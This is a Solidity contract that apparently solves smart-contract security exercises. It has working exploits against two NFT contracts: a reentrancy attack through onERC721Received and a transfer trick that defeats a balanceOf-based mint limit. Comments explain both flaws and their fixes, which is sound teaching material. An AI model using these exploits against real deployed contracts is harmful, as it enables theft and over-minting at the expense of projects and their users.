// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.19;

import { IERC721Receiver } from "@openzeppelin/contracts/interfaces/IERC721Receiver.sol";

import { Overmint1 } from "./riddles/Overmint1.sol";
import { Overmint2 } from "./riddles/Overmint2.sol";

contract RiddleSolver is IERC721Receiver {
    Overmint1 private immutable _overmint1;
    Overmint2 private immutable _overmint2;
    address private immutable _owner;

    constructor(address overmint1_, address overmint2_) {
        _overmint1 = Overmint1(overmint1_);
        _overmint2 = Overmint2(overmint2_);
        _owner = msg.sender;
    }

    /**
     * @dev mints 5 NFTs of Overmint1 contract by making use of reentrancy attack
     * through onERC721Received().
     *
     * A possible solution is to adhere to Checks-Effects-Interactions by caling _safeMint
     * after all the states have been updated.
     *
     * {safeTransferFrom} withdraws tokens to the owner. Anybody can call this function but tokens can only
     * be transferred to the owner of this contract.
     */
    function exploitMint1() external {
        _overmint1.mint();
        uint256 totalSupply = _overmint1.totalSupply();
        for (uint256 i; i < 5; ++i) {
            unchecked {
                _overmint1.safeTransferFrom(address(this), _owner, totalSupply - i);
            }
        }
    }

    function onERC721Received(address, address, uint256, bytes calldata) external override returns (bytes4 selector_) {
        // only runs 4 times
        if (_overmint1.balanceOf(address(this)) < 5) {
            _overmint1.mint();
        }
        selector_ = IERC721Receiver.onERC721Received.selector;
    }

    /**
     * @dev mints 5 NFTs of Overmint2 contract. The mint() function uses balanceOf() as a requirement
     * to mint a new token but it can be tricked by transfeerring minted NFT to another address.
     *
     * A possible solution is to use a mapping to store tokens amount minted by an address.
     */
    function exploitMint2() external {
        uint256 totalSupply = _overmint2.totalSupply();
        for (uint256 i; i < 5; ++i) {
            _overmint2.mint();
            unchecked {
                _overmint2.safeTransferFrom(address(this), _owner, totalSupply + 1 + i);
            }
        }
    }
}
